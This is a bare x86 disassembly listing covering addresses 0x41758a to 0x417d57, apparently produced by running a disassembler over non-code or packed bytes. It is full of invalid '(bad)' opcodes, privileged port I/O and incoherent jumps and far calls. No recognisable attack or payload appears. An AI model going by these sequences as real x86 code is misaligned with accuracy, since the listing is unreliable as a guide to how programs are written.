  41758a:	sti    
  41758b:	scas   al,BYTE PTR es:[edi]
  41758c:	xor    DWORD PTR [eax+0x5396108],0x6605939b
  417596:	std    
  417597:	les    ebx,FWORD PTR [edx-0x14]
  41759a:	pop    ss
  41759b:	ror    BYTE PTR [edx],1
  41759d:	addr16 pop esi
  4175a0:	sub    al,0x99
  4175a2:	push   ebx
  4175a3:	icebp  
  4175a4:	sub    ebx,0x6e
  4175a7:	cmp    eax,0x5618244d
  4175ac:	push   0xffffffd7
  4175ae:	pop    esp
  4175af:	sub    al,0x6
  4175b1:	xlat   BYTE PTR ds:[ebx]
  4175b2:	mov    cl,0x46
  4175b4:	push   cs
  4175b5:	mov    ecx,0x635d5887
  4175ba:	add    al,0xe8
  4175bc:	pop    edx
  4175bd:	cmp    al,0x96
  4175bf:	mov    bh,0xcb
  4175c1:	(bad)  
  4175c2:	mov    esp,0x8a3b85aa
  4175c7:	and    DWORD PTR [eax-0x2b],ebx
  4175ca:	test   dh,bl
  4175cc:	cmp    esi,ebx
  4175ce:	call   0x343e:0x1aba505
  4175d5:	sub    eax,0x9ef6b0b1
  4175da:	jne    0x417626
  4175dc:	or     bh,cl
  4175de:	push   ecx
  4175df:	mov    esp,0x8698eec
  4175e4:	dec    ebp
  4175e5:	pop    esp
  4175e6:	jmp    0x4175de
  4175e8:	adc    BYTE PTR [edx],0xb
  4175eb:	mov    WORD PTR [edx+eiz*1+0x1b1ac942],ss
  4175f2:	aad    0x94
  4175f4:	test   al,0x16
  4175f6:	inc    eax
  4175f7:	(bad)  
  4175f9:	dec    ebx
  4175fa:	or     eax,0x6d1041ee
  4175ff:	mov    WORD PTR [eax],?
  417601:	push   esi
  417602:	(bad)  
  417603:	mov    esp,0x45f53519
  417608:	sub    ebx,ecx
  41760a:	add    eax,0x8f9cf71a
  41760f:	mov    bh,0xd9
  417611:	jb     0x4175b6
  417613:	or     al,0x3a
  417615:	retf   
  417616:	cmp    al,0xbb
  417618:	and    BYTE PTR [edi+0xb],0x30
  41761c:	xor    BYTE PTR [edx-0x5d97a774],bh
  417622:	sti    
  417623:	call   0xbdc4bebc
  417628:	dec    eax
  417629:	mov    eax,0x4dd927fe
  41762e:	and    edi,DWORD PTR ds:0x422d392e
  417634:	add    dh,BYTE PTR [esi-0xd89f8c0]
  41763a:	enter  0x1f3f,0x5d
  41763e:	out    0x34,eax
  417640:	ins    BYTE PTR es:[edi],dx
  417641:	cmp    esi,DWORD PTR [edi+0x121aa5c5]
  417647:	xor    DWORD PTR [eax],edx
  417649:	or     al,0xe8
  41764b:	in     al,0x30
  41764d:	cmp    edi,0x63
  417650:	(bad)  
  417651:	and    al,0x46
  417653:	pop    edi
  417654:	lods   eax,DWORD PTR ds:[esi]
  417655:	and    al,0xed
  417657:	sub    ebp,DWORD PTR [ebp+0x78]
  41765a:	cmp    DWORD PTR [eax+0x56],esp
  41765d:	inc    eax
  41765e:	hlt    
  41765f:	pop    ecx
  417660:	xchg   BYTE PTR [esi+0x39],cl
  417663:	out    0x7e,al
  417665:	in     al,dx
  417666:	loope  0x4175fb
  417668:	imul   edi,ebp,0xb
  41766b:	lahf   
  41766c:	call   0x1a5d:0xf00ad406
  417673:	add    al,0xa3
  417675:	add    al,0x14
  417677:	jmp    0xa581bf94
  41767c:	popf   
  41767d:	out    0xa2,al
  41767f:	pop    edi
  417680:	push   edi
  417681:	out    0x73,eax
  417683:	stc    
  417684:	idiv   BYTE PTR [edi-0x550490a8]
  41768a:	xchg   esi,eax
  41768b:	xchg   ebx,eax
  41768c:	sbb    BYTE PTR [eax-0x5f],dh
  41768f:	jecxz  0x417690
  417691:	mov    ds,ebp
  417693:	mov    ebp,0x21e56be
  417698:	sahf   
  417699:	mov    edx,0xdd489433
  41769e:	mov    ebx,0x3d20ad7f
  4176a3:	out    0x30,eax
  4176a5:	scas   eax,DWORD PTR es:[edi]
  4176a6:	out    dx,al
  4176a7:	xchg   esp,eax
  4176a8:	add    al,0xee
  4176aa:	dec    edx
  4176ab:	test   BYTE PTR [ecx],0xd1
  4176ae:	ss inc esp
  4176b0:	fstp   TBYTE PTR [edx+0x66cad33c]
  4176b6:	xchg   DWORD PTR [esi],edi
  4176b8:	test   eax,0xd3b9a907
  4176bd:	enter  0xc767,0x43
  4176c1:	inc    ebp
  4176c2:	jo     0x4176f4
  4176c4:	add    BYTE PTR [edi+edx*4+0x21cc142b],al
  4176cb:	xor    al,0xb3
  4176cd:	mov    cl,0x41
  4176cf:	data16 sbb BYTE PTR [ebx],dh
  4176d2:	aaa    
  4176d3:	sbb    dh,BYTE PTR [edi]
  4176d5:	stos   BYTE PTR es:[edi],al
  4176d6:	out    0x55,al
  4176d8:	pushf  
  4176d9:	imul   edx,ecx,0x58bf68a3
  4176df:	mov    ebx,0x88ff62a4
  4176e4:	in     eax,0xa2
  4176e6:	mov    al,0xc3
  4176e8:	into   
  4176e9:	ins    DWORD PTR es:[edi],dx
  4176ea:	call   0xd30f:0x64a88a15
  4176f1:	lea    ecx,[esi]
  4176f3:	push   es
  4176f4:	and    al,0x58
  4176f6:	stos   BYTE PTR es:[edi],al
  4176f7:	cmc    
  4176f8:	sbb    BYTE PTR [edi-0x38],0xad
  4176fc:	push   0x4b1efdbf
  417701:	xchg   BYTE PTR [ebx-0x1db99002],dl
  417707:	xchg   edx,eax
  417708:	daa    
  417709:	jnp    0x417749
  41770b:	jge    0x4176bf
  41770d:	or     ebp,DWORD PTR [ebp+0x26]
  417710:	mov    dh,0x2e
  417712:	mov    ds:0xdd8a8282,al
  417717:	jno    0x417763
  417719:	mov    eax,0xc94308a0
  41771e:	loope  0x41773c
  417720:	push   esp
  417721:	fdiv   st(7),st
  417723:	repz jl 0x41777a
  417726:	push   0xac3a966c
  41772b:	add    BYTE PTR [ebp-0x4b265d2],0xab
  417732:	stc    
  417733:	cdq    
  417734:	fsubr  DWORD PTR [ebp-0x9]
  417737:	lods   al,BYTE PTR ds:[esi]
  417738:	cwde   
  417739:	xor    eax,0x92b3cf83
  41773e:	push   esp
  41773f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417740:	sti    
  417741:	jne    0x4177be
  417743:	pop    ebx
  417744:	nop
  417745:	inc    ebx
  417746:	push   ebp
  417747:	mov    bh,0xbe
  417749:	sub    al,0x2c
  41774b:	push   0xffffff88
  41774d:	into   
  41774e:	fsubr  st(1),st
  417750:	pop    esp
  417751:	inc    eax
  417752:	cmp    eax,0x40f749d7
  417757:	or     DWORD PTR [ecx],esp
  417759:	xchg   ebp,eax
  41775a:	or     cl,dl
  41775c:	std    
  41775d:	push   ebx
  41775e:	popf   
  41775f:	xchg   edi,eax
  417760:	jmp    0xe13e:0x54005030
  417767:	repz sar DWORD PTR [ecx],cl
  41776a:	outs   dx,BYTE PTR ds:[esi]
  41776b:	ds jb  0x41777a
  41776e:	or     edi,esp
  417770:	cwde   
  417771:	xor    eax,0x5e53f61e
  417776:	cs aam 0x6d
  417779:	sbb    DWORD PTR [ebp+0x436e1888],edi
  41777f:	jle    0x41779e
  417781:	loopne 0x41774a
  417783:	int    0x3d
  417785:	in     al,0xde
  417787:	sub    eax,0xc2a2d290
  41778c:	mov    ds,WORD PTR [ecx+0x4c]
  41778f:	or     dh,BYTE PTR [esi-0x4e]
  417792:	rcl    DWORD PTR [eax-0x64],1
  417795:	ret    0xcf91
  417798:	(bad)  
  417799:	mov    ebp,0x4e4bb98e
  41779e:	ror    DWORD PTR ds:0x6342c575,cl
  4177a4:	je     0x41781a
  4177a6:	push   cs
  4177a7:	gs jae 0x41773b
  4177aa:	xchg   edx,eax
  4177ab:	jle    0x41780a
  4177ad:	rol    esp,0x97
  4177b0:	xchg   edx,eax
  4177b1:	aaa    
  4177b2:	adc    edx,DWORD PTR [eax]
  4177b4:	sbb    al,0x3d
  4177b6:	sbb    BYTE PTR [eax+0x40361405],bh
  4177bc:	sahf   
  4177bd:	sti    
  4177be:	cmp    DWORD PTR [ecx*8+0x31eb7a81],edx
  4177c5:	pop    ebp
  4177c6:	mul    ebp
  4177c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177c9:	or     al,0xc2
  4177cb:	lods   eax,DWORD PTR ds:[esi]
  4177cc:	mov    ah,0x55
  4177ce:	xchg   edx,eax
  4177cf:	shl    ch,1
  4177d1:	jmp    0x417852
  4177d3:	dec    edx
  4177d4:	lea    eax,[esi]
  4177d6:	mov    dl,0xc4
  4177d8:	xor    DWORD PTR [ebp+0x1c00d335],edx
  4177de:	pop    edx
  4177df:	xlat   BYTE PTR ds:[ebx]
  4177e0:	mov    dl,0xda
  4177e2:	call   0xb4ec:0x328ff8d1
  4177e9:	mov    cl,0x3
  4177eb:	jae    0x4177d6
  4177ed:	mov    eax,ds:0xd83db257
  4177f2:	mov    eax,0xc7067054
  4177f7:	pop    edi
  4177f8:	bound  ebx,QWORD PTR [eax+0x3cb1213a]
  4177fe:	(bad)  
  4177ff:	jecxz  0x41778a
  417801:	inc    edi
  417802:	fiadd  DWORD PTR cs:[ebx+0x7e8f8885]
  417809:	addr16 jmp 0x4177b7
  41780c:	add    al,0x6c
  41780e:	nop
  41780f:	mov    dh,0xb3
  417811:	pop    ebp
  417812:	sub    al,0xe5
  417814:	fisttp WORD PTR [eax+0x6]
  417817:	nop
  417818:	je     0x41788b
  41781a:	sub    edx,0xffffff82
  41781d:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41781f:	icebp  
  417820:	adc    DWORD PTR [edi-0x73],ebx
  417823:	sbb    al,al
  417825:	jle    0x417817
  417827:	sbb    edx,DWORD PTR [edi+eax*8]
  41782a:	cmp    ch,BYTE PTR [eiz*8-0x77058971]
  417831:	outs   dx,BYTE PTR ds:[esi]
  417832:	cmp    eax,DWORD PTR [edi*4-0x5aaea515]
  417839:	push   ds
  41783a:	push   ecx
  41783b:	mov    al,0xb6
  41783d:	lods   al,BYTE PTR ds:[esi]
  41783e:	inc    edx
  41783f:	mov    ah,0xb2
  417841:	and    ecx,DWORD PTR ds:0x4deb1010
  417847:	popf   
  417848:	(bad)  
  417849:	(bad)  
  41784b:	jno    0x41787a
  41784d:	arpl   WORD PTR [ecx-0x4d2c94fb],dx
  417853:	or     bl,ch
  417855:	in     al,dx
  417856:	fcomp  QWORD PTR [ebx+ebx*8+0x501204c8]
  41785d:	and    al,0xd5
  41785f:	lea    edi,[edi+0x73a7de40]
  417865:	push   ebp
  417866:	pop    eax
  417867:	mov    BYTE PTR [edi],al
  417869:	xor    cl,BYTE PTR [edx+0x139fdb05]
  41786f:	pushf  
  417870:	cmp    DWORD PTR [esi],eax
  417872:	bnd ret 
  417874:	maxps  xmm7,xmm0
  417877:	add    cl,BYTE PTR [ecx+0xd]
  41787a:	push   edx
  41787b:	hlt    
  41787c:	push   0xa3d92591
  417881:	inc    ebp
  417882:	add    BYTE PTR [esi-0x4b],0x82
  417886:	iret   
  417887:	sub    DWORD PTR [esi+0x13426c66],ecx
  41788d:	xchg   esp,eax
  41788e:	(bad)  
  41788f:	sub    edi,esp
  417891:	int    0xaf
  417893:	sbb    DWORD PTR [ebx],eax
  417895:	cmp    dl,bh
  417897:	pop    esp
  417898:	loope  0x4178eb
  41789a:	jmp    0xf5b0ca2d
  41789f:	loope  0x417883
  4178a1:	call   0x91ac8b1a
  4178a6:	ins    BYTE PTR es:[edi],dx
  4178a7:	aad    0x4e
  4178a9:	mov    eax,ds:0xc0ca1c6e
  4178ae:	mov    al,0xd0
  4178b0:	mov    WORD PTR ds:0x6e8a3eaa,ss
  4178b6:	dec    esi
  4178b7:	push   0x25663321
  4178bc:	push   edi
  4178bd:	je     0x4178b3
  4178bf:	outs   dx,BYTE PTR ds:[esi]
  4178c0:	and    ebp,esi
  4178c2:	or     DWORD PTR [esi-0x51550748],edx
  4178c8:	sub    BYTE PTR [edx+0x652aa462],al
  4178ce:	push   esi
  4178cf:	push   0xe89bcab4
  4178d4:	pop    eax
  4178d5:	daa    
  4178d6:	push   esp
  4178d7:	mov    es:0xa97d7c8e,eax
  4178dd:	adc    BYTE PTR [eax],ah
  4178df:	add    cl,ah
  4178e1:	mov    bl,BYTE PTR [ebp-0x23]
  4178e4:	scas   al,BYTE PTR es:[edi]
  4178e5:	lahf   
  4178e6:	mov    edi,0x91a7d444
  4178eb:	mov    bl,0x3d
  4178ed:	outs   dx,BYTE PTR ds:[esi]
  4178ee:	jo     0x4178d5
  4178f0:	add    DWORD PTR [edx],esi
  4178f2:	push   0xa0116c73
  4178f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178f8:	cwde   
  4178f9:	scas   al,BYTE PTR es:[edi]
  4178fa:	adc    DWORD PTR [edx-0x19],edi
  4178fd:	les    edi,FWORD PTR ds:0x74ad532d
  417903:	or     eax,0x367d11ec
  417908:	fsub   QWORD PTR [edi+eax*1+0x1e]
  41790c:	scas   eax,DWORD PTR es:[edi]
  41790d:	mov    dh,0x2b
  41790f:	daa    
  417910:	pop    ss
  417911:	(bad)  
  417912:	es es jns 0x417926
  417916:	mov    esi,0x97362e85
  41791b:	or     DWORD PTR [esi+edx*1],edx
  41791e:	and    al,0x33
  417920:	lods   al,BYTE PTR ds:[esi]
  417921:	mov    bh,ch
  417923:	mov    ds:0x52fa5c72,al
  417928:	lods   eax,DWORD PTR ds:[esi]
  417929:	lods   eax,DWORD PTR ds:[esi]
  41792a:	sub    ecx,DWORD PTR [edi-0x33]
  41792d:	stc    
  41792e:	pop    ecx
  41792f:	scas   eax,DWORD PTR es:[edi]
  417930:	icebp  
  417931:	mov    ebp,0x9ad7d92c
  417936:	dec    ebx
  417937:	hlt    
  417938:	pop    ds
  417939:	xchg   ecx,eax
  41793a:	leave  
  41793b:	xor    al,0x3f
  41793d:	inc    edx
  41793e:	adc    DWORD PTR [esi+0x50],eax
  417941:	inc    esp
  417942:	mov    eax,ds:0xd74153fc
  417947:	mov    dl,0xdf
  417949:	xchg   BYTE PTR [esi-0x6ba32e0b],ah
  41794f:	gs sti 
  417951:	imul   ebp,DWORD PTR [eax-0x6e],0x9eef2b7f
  417958:	loope  0x417988
  41795a:	mov    ebx,DWORD PTR [ebx-0x4]
  41795d:	arpl   WORD PTR [eax],ax
  41795f:	test   al,0xb3
  417961:	stos   DWORD PTR es:[edi],eax
  417962:	cmp    ebp,DWORD PTR [edi-0x515a5145]
  417968:	cs jne 0x417967
  41796b:	aam    0x67
  41796d:	fwait
  41796e:	sub    eax,edi
  417970:	ror    BYTE PTR [edx],1
  417972:	jmp    0x4179ab
  417974:	fsub   st(4),st
  417976:	mov    al,ds:0x323ef61d
  41797b:	adc    BYTE PTR [eax-0x55a65abd],0x61
  417982:	fdivrp st(3),st
  417984:	wbinvd 
  417986:	jmp    0x417980
  417988:	lock push es
  41798a:	daa    
  41798b:	sti    
  41798c:	nop
  41798d:	sbb    bl,BYTE PTR [edi]
  41798f:	sub    al,0xfe
  417991:	cli    
  417992:	(bad)  
  417993:	sub    dl,cl
  417995:	lock fsubp st(5),st
  417998:	inc    eax
  417999:	mov    esp,0xe9f2f45c
  41799e:	push   cs
  41799f:	inc    ebp
  4179a0:	pop    edi
  4179a1:	sub    al,0xbc
  4179a3:	inc    ebp
  4179a4:	js     0x4179a8
  4179a6:	scas   al,BYTE PTR es:[edi]
  4179a7:	sbb    DWORD PTR [ebx],ebp
  4179a9:	mov    dh,0xaf
  4179ab:	sub    eax,0x160b032
  4179b0:	sbb    al,BYTE PTR [eax]
  4179b2:	sub    cl,BYTE PTR [ecx-0x15]
  4179b5:	scas   al,BYTE PTR es:[edi]
  4179b6:	test   eax,0x60b40c2c
  4179bb:	and    DWORD PTR [ebx+0x7434fcf8],0xffffffe4
  4179c2:	sub    eax,0xe677f8ec
  4179c7:	pop    DWORD PTR ds:0xd4978548
  4179cd:	pop    ebp
  4179ce:	or     eax,DWORD PTR [eax]
  4179d0:	test   DWORD PTR [esi],0xd0ecc990
  4179d6:	mov    BYTE PTR [ecx-0x55],bh
  4179d9:	sub    esi,eax
  4179db:	mov    dl,0xeb
  4179dd:	dec    ebx
  4179de:	stc    
  4179df:	xor    WORD PTR [eax+eax*4],0x68
  4179e4:	push   cs
  4179e5:	mov    dl,0x9b
  4179e7:	add    eax,0xbd6e7e
  4179ec:	es dec ecx
  4179ee:	pop    ebp
  4179ef:	fdivr  DWORD PTR [ecx-0x6f100df5]
  4179f6:	outs   dx,DWORD PTR ds:[esi]
  4179f7:	mov    BYTE PTR [ebx],bl
  4179f9:	pop    es
  4179fa:	push   ebp
  4179fb:	fdivr  DWORD PTR [edx+0x5a7e1068]
  417a01:	pop    ecx
  417a02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a03:	dec    ecx
  417a04:	and    BYTE PTR [edi+0x5d],ah
  417a07:	mov    ebp,0x76945aa
  417a0c:	adc    BYTE PTR [edx+0x65383c27],dl
  417a12:	pushf  
  417a13:	and    ecx,edx
  417a15:	xchg   edx,eax
  417a16:	out    0xfd,al
  417a18:	inc    ecx
  417a19:	mov    ch,BYTE PTR [ecx+0x1b62190f]
  417a1f:	mov    edx,DWORD PTR [eax]
  417a21:	sahf   
  417a22:	loop   0x417a80
  417a24:	int    0x9
  417a26:	ror    DWORD PTR [esi-0x4c],1
  417a29:	push   esp
  417a2a:	test   ebp,ecx
  417a2c:	or     BYTE PTR [esi],cl
  417a2e:	fwait
  417a2f:	add    bh,BYTE PTR [ebp+0x7c]
  417a32:	sub    al,0xf0
  417a34:	jl     0x417aa3
  417a36:	xchg   esi,eax
  417a37:	mov    ds:0x396b253a,al
  417a3c:	xchg   edi,eax
  417a3d:	push   ebx
  417a3e:	ss sbb eax,0xa55cc03e
  417a44:	push   ebp
  417a45:	or     al,0xc5
  417a47:	mov    dl,0xf1
  417a49:	out    0xa4,al
  417a4b:	push   cs
  417a4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a4d:	adc    BYTE PTR [eax],dh
  417a4f:	cmp    dh,BYTE PTR [ecx]
  417a51:	lds    esi,FWORD PTR [ebx+0x68a9bb8b]
  417a57:	out    dx,al
  417a58:	(bad)  
  417a59:	fld    DWORD PTR fs:[ebp-0x80]
  417a5d:	in     eax,0x36
  417a5f:	ja     0x417a33
  417a61:	add    eax,0x5eb2bdb5
  417a66:	ret    
  417a67:	ret    
  417a68:	aaa    
  417a69:	aam    0x7
  417a6b:	mov    ds:0xf02b77a6,eax
  417a71:	cli    
  417a72:	sahf   
  417a73:	push   cs
  417a74:	(bad)  
  417a76:	mov    esi,0x6c7c5041
  417a7b:	iret   
  417a7c:	gs (bad) 
  417a80:	into   
  417a81:	mov    ebx,0x730d89cd
  417a86:	mov    ch,0xf7
  417a88:	push   ss
  417a89:	mov    ds:0x87549521,al
  417a8e:	cdq    
  417a8f:	jg     0x417a6a
  417a91:	xor    al,0xc9
  417a93:	inc    edx
  417a94:	dec    ebx
  417a95:	add    DWORD PTR [ebx],esi
  417a97:	(bad)  
  417a98:	scas   eax,DWORD PTR es:[edi]
  417a99:	xlat   BYTE PTR ds:[ebx]
  417a9a:	out    dx,eax
  417a9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a9c:	sahf   
  417a9d:	int3   
  417a9e:	es popf 
  417aa0:	cld    
  417aa1:	dec    ebx
  417aa2:	stc    
  417aa3:	or     BYTE PTR [edi+0x698f5241],bl
  417aa9:	test   DWORD PTR [ecx-0x24],0x20490f64
  417ab0:	pushf  
  417ab1:	inc    eax
  417ab2:	dec    esi
  417ab3:	jg     0x417aee
  417ab5:	dec    edx
  417ab6:	jmp    0x5cd9a1a7
  417abb:	daa    
  417abc:	cmc    
  417abd:	xor    cl,dh
  417abf:	fldpi  
  417ac1:	xor    esp,DWORD PTR [ecx-0x4fd9507b]
  417ac7:	pushf  
  417ac8:	retf   0x37f7
  417acb:	pop    ss
  417acc:	fnstcw WORD PTR [edx+0xf74d92a]
  417ad2:	les    esi,FWORD PTR [edi]
  417ad4:	in     eax,0x7a
  417ad6:	hlt    
  417ad7:	jge    0x417ac8
  417ad9:	dec    edx
  417ada:	push   esp
  417adb:	mov    dh,0x64
  417add:	mov    ecx,0xf382a97c
  417ae2:	push   0x3ad6b21b
  417ae7:	vmulss xmm2,xmm6,DWORD PTR [edi]
  417aeb:	(bad)  
  417aed:	jecxz  0x417a8e
  417aef:	retf   
  417af0:	daa    
  417af1:	ret    0x2cc6
  417af4:	pushf  
  417af5:	loop   0x417ae4
  417af7:	mov    al,0xef
  417af9:	cmp    eax,0xd42dcaef
  417afe:	mov    ds:0x3a2ec7ab,al
  417b03:	ins    BYTE PTR es:[edi],dx
  417b04:	dec    edx
  417b05:	jne    0x417aa7
  417b07:	daa    
  417b08:	push   ss
  417b09:	pop    edx
  417b0a:	ficom  WORD PTR [eax+0x3be5c355]
  417b10:	in     al,dx
  417b11:	out    dx,eax
  417b12:	adc    DWORD PTR [ebp+0xb],esp
  417b15:	fsubp  st(7),st
  417b17:	and    BYTE PTR [ecx+0x3c2a9272],dh
  417b1d:	es pop esp
  417b1f:	adc    cl,BYTE PTR [edi]
  417b21:	adc    al,0xbd
  417b23:	daa    
  417b24:	in     eax,0x53
  417b26:	fdivr  st,st(2)
  417b28:	cs test al,ch
  417b2b:	sub    DWORD PTR [ecx-0x34dc44ea],ecx
  417b31:	sub    ebp,DWORD PTR [edx-0x13748ac]
  417b37:	jne    0x417aff
  417b39:	pop    ss
  417b3a:	popf   
  417b3b:	push   es
  417b3c:	xor    eax,0x7d9d8725
  417b41:	pop    ecx
  417b42:	neg    DWORD PTR [edx+0x71]
  417b45:	clc    
  417b46:	jns    0x417ae0
  417b48:	mov    cl,0x9e
  417b4a:	inc    eax
  417b4b:	nop
  417b4c:	push   0x24
  417b4e:	xchg   ecx,eax
  417b4f:	jno    0x417b01
  417b51:	fidiv  WORD PTR [ebx]
  417b53:	repz daa 
  417b55:	jmp    0x417b1a
  417b57:	dec    ebx
  417b58:	sub    DWORD PTR [ecx+0x6aef9cca],edx
  417b5e:	mov    ds:0xbcbe144e,eax
  417b63:	out    dx,al
  417b64:	push   ss
  417b65:	popf   
  417b66:	fnstcw WORD PTR [edi-0x23]
  417b69:	inc    edi
  417b6a:	mov    al,ds:0xa107cf5d
  417b6f:	add    eax,0xdfa56008
  417b74:	loop   0x417b54
  417b76:	out    0x98,al
  417b78:	loopne 0x417b32
  417b7a:	ds in  eax,dx
  417b7c:	imul   esi,edi,0x13
  417b7f:	sbb    eax,0xceb2f32f
  417b84:	xchg   ebx,eax
  417b85:	aaa    
  417b86:	mov    bl,0xfd
  417b88:	mov    esp,0xa0df66d3
  417b8d:	dec    edi
  417b8e:	lds    eax,FWORD PTR [eax+edx*1+0x4a713cad]
  417b95:	shl    BYTE PTR ds:0x7cab3f10,1
  417b9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b9c:	add    BYTE PTR [esi],0x8c
  417b9f:	push   es
  417ba0:	leave  
  417ba1:	mov    ds:0xb5c2f1a8,al
  417ba6:	xor    eax,DWORD PTR [ebx+0x4e]
  417ba9:	and    BYTE PTR [esi+eiz*4-0x4],cl
  417bad:	xlat   BYTE PTR ds:[ebx]
  417bae:	icebp  
  417baf:	cdq    
  417bb0:	mov    ecx,0x59bae935
  417bb5:	aaa    
  417bb6:	fiadd  DWORD PTR [esi-0x3af5d3ae]
  417bbc:	out    dx,al
  417bbd:	jnp    0x417b41
  417bbf:	xchg   DWORD PTR [edi],ecx
  417bc1:	loope  0x417bb0
  417bc3:	sbb    DWORD PTR [eax-0x319d70db],esi
  417bc9:	out    dx,eax
  417bca:	je     0x417c0d
  417bcc:	push   ss
  417bcd:	jle    0x417bf1
  417bcf:	or     BYTE PTR [ebx-0x2a],0x69
  417bd3:	call   0x96ff2586
  417bd8:	xchg   ecx,eax
  417bd9:	mov    esp,0x912fbba4
  417bde:	leave  
  417bdf:	and    DWORD PTR [edi+0x21d01801],ebp
  417be5:	add    eax,0x655eb7a8
  417bea:	jmp    0x417b9e
  417bec:	mov    bl,0x9a
  417bee:	dec    ebp
  417bef:	into   
  417bf0:	inc    DWORD PTR [eax-0x37]
  417bf3:	xor    eax,0x5352c2aa
  417bf8:	add    eax,0x218ef49b
  417bfd:	test   BYTE PTR [edx+0x48652d2f],dh
  417c03:	outs   dx,DWORD PTR ds:[esi]
  417c04:	xchg   esi,eax
  417c05:	fcomp  DWORD PTR [ebx]
  417c07:	dec    esi
  417c08:	adc    ch,ch
  417c0a:	dec    ebp
  417c0b:	push   ecx
  417c0c:	mov    dh,0xed
  417c0e:	push   ds
  417c0f:	mov    ecx,0x99af65df
  417c14:	int    0x9
  417c16:	stc    
  417c17:	cmc    
  417c18:	mov    cl,0x27
  417c1a:	add    DWORD PTR [esi],edi
  417c1c:	mov    al,0xf7
  417c1e:	les    eax,FWORD PTR [eax]
  417c20:	cmp    al,0xdb
  417c22:	out    0x79,eax
  417c24:	add    DWORD PTR [ebx-0x795945a3],ebx
  417c2a:	mov    al,0x2a
  417c2c:	sub    DWORD PTR [esp+eax*8-0x206205b2],0x3e608f4a
  417c37:	xor    al,0xee
  417c39:	xor    DWORD PTR [ebp+0x2579ddd5],ecx
  417c3f:	xor    esi,DWORD PTR [edx+0x234379a8]
  417c45:	mov    bl,0xca
  417c47:	div    BYTE PTR [ebp-0x3a83fdb]
  417c4d:	aad    0xc7
  417c4f:	pop    ss
  417c50:	jae    0x417c5b
  417c52:	push   ds
  417c53:	jmp    0x417c7e
  417c55:	sbb    edi,edx
  417c57:	mov    ch,0x2f
  417c59:	push   cs
  417c5a:	cmp    DWORD PTR [ebp-0x5d0a7903],0xf9621c20
  417c64:	or     al,0xf
  417c66:	lods   eax,DWORD PTR ds:[esi]
  417c67:	mov    ebp,0x56a803ae
  417c6c:	push   edx
  417c6d:	popa   
  417c6e:	stc    
  417c6f:	ja     0x417c40
  417c71:	cld    
  417c72:	mov    eax,ds:0xa711f997
  417c77:	popf   
  417c78:	dec    esp
  417c79:	mov    eax,0x7fbf4e75
  417c7e:	int3   
  417c7f:	jns    0x417cfe
  417c81:	call   0xd083:0x1e2f431f
  417c88:	mov    ah,0x6
  417c8a:	sub    DWORD PTR [edi],ebx
  417c8c:	mov    ch,0xd5
  417c8e:	aas    
  417c8f:	xchg   BYTE PTR [esi+0x1],al
  417c92:	mov    ds:0x728afe69,al
  417c97:	pop    ds
  417c98:	hlt    
  417c99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c9a:	push   eax
  417c9b:	xor    dh,ah
  417c9d:	dec    eax
  417c9e:	rcr    BYTE PTR [edi-0xc7404f3],1
  417ca4:	icebp  
  417ca5:	adc    al,0x84
  417ca7:	out    dx,eax
  417ca8:	in     eax,0xf6
  417caa:	scas   al,BYTE PTR es:[edi]
  417cab:	jge    0x417c3f
  417cad:	jo     0x417cfc
  417caf:	dec    edx
  417cb0:	pop    ds
  417cb1:	xchg   ebx,eax
  417cb2:	lods   al,BYTE PTR ds:[esi]
  417cb3:	dec    esi
  417cb4:	out    dx,al
  417cb5:	inc    edx
  417cb6:	xor    ebp,DWORD PTR [ebp-0x57]
  417cb9:	fidivr DWORD PTR ds:0x1dcb8f0d
  417cbf:	mov    DWORD PTR [edx-0x72],ebp
  417cc2:	iret   
  417cc3:	iret   
  417cc4:	enter  0xfcfb,0x56
  417cc8:	mov    ecx,0x862926ad
  417ccd:	pop    ebp
  417cce:	xor    DWORD PTR [eax+edi*4+0x4caad944],esp
  417cd5:	dec    edx
  417cd6:	(bad)  
  417cd7:	fisubr DWORD PTR [edx]
  417cd9:	mov    bl,0x38
  417cdb:	add    esi,edi
  417cdd:	cmp    DWORD PTR [edx],eax
  417cdf:	dec    eax
  417ce0:	inc    edi
  417ce1:	fimul  DWORD PTR [edx+0x3e2ac6d1]
  417ce7:	aas    
  417ce8:	outs   dx,BYTE PTR ds:[esi]
  417ce9:	mov    BYTE PTR [edi+eax*2-0xf90b871],al
  417cf0:	push   0x8
  417cf2:	dec    esp
  417cf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cf4:	push   ss
  417cf5:	add    BYTE PTR [eax+0x7818a23e],bl
  417cfb:	std    
  417cfc:	clc    
  417cfd:	loopne 0x417c8e
  417cff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d00:	xchg   esp,eax
  417d01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d02:	push   ds
  417d03:	mov    eax,ds:0x1bdbf258
  417d08:	ja     0x417d84
  417d0a:	push   edx
  417d0b:	xchg   ebp,eax
  417d0c:	fimul  DWORD PTR [esi+0x71]
  417d0f:	cwde   
  417d10:	outs   dx,BYTE PTR ds:[esi]
  417d11:	push   0x4b
  417d13:	push   0xffffffb3
  417d15:	sub    DWORD PTR [eax+0x3c7f48e8],edi
  417d1b:	mov    al,ds:0x712654a2
  417d20:	or     ah,BYTE PTR [ebx+esi*8-0x62]
  417d24:	icebp  
  417d25:	lahf   
  417d26:	add    BYTE PTR [esi+0x3bbaab2d],0x99
  417d2d:	xchg   edx,eax
  417d2e:	ja     0x417cce
  417d30:	in     eax,0xbe
  417d32:	sub    BYTE PTR [edx],ch
  417d34:	repz mov WORD PTR [ebp+0x4f],es
  417d38:	jb     0x417cbc
  417d3a:	dec    edi
  417d3b:	dec    esi
  417d3c:	xchg   edx,eax
  417d3d:	fisttp WORD PTR [edi+0x11dc7d8a]
  417d43:	mov    eax,ds:0x97c07097
  417d48:	adc    DWORD PTR [ebx],eax
  417d4a:	add    eax,0x32ea22d5
  417d4f:	fcom   DWORD PTR [edi]
  417d51:	xor    BYTE PTR [ebp+0x1e538053],ah
  417d57:	cmp    al,0xac
